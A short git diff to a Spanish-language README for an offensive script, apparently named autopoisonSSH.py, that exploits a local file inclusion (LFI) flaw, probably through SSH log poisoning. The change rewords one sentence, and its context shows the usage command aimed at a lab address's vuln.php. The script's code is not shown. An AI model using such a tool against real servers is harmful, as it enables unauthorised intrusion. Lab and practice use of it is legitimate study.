@@ -51,7 +51,7 @@ En primer lugar debemos detecar la ruta donde se acontecede el **LFI**:
 
 ![Pasted image 20240806161403](https://github.com/user-attachments/assets/9238bfd1-c0f2-4eef-abbf-6729aa0457ca)
 
-En segundo y último lugar ejecutaremos el script de la siguiente forma:
+En segundo y último lugar ejecutaremos el script pasandole los parámetros necesatarios tal y como vemos acontinuación:
 
 ```shell
 python3 autopoisonSSH.py -u http://172.17.0.2/vuln.php -pm file -t-ip 172.17.0.1 -h-ip 172.17.0.2
